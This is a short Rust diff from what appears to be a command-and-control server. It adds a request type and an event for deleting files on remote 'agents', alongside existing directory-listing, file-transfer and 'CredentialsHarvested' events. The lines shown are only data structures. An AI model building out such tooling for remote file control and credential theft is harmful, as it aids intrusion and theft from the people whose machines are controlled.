@@ -71,6 +71,12 @@ pub struct ListDirRequest {
     pub path: String,
 }
 
+/// Delete request payload
+#[derive(Debug, Deserialize)]
+pub struct DeleteRequest {
+    pub path: String,
+}
+
 /// Change directory request
 #[derive(Debug, Deserialize)]
 pub struct CdRequest {
@@ -173,6 +179,11 @@ pub enum ServerEvent {
         filename: String,
         size: usize,
         save_path: String,
+    },
+    /// File or directory deleted
+    FileDeleted {
+        agent_id: u64,
+        path: String,
     },
     /// Credentials harvested
     CredentialsHarvested {
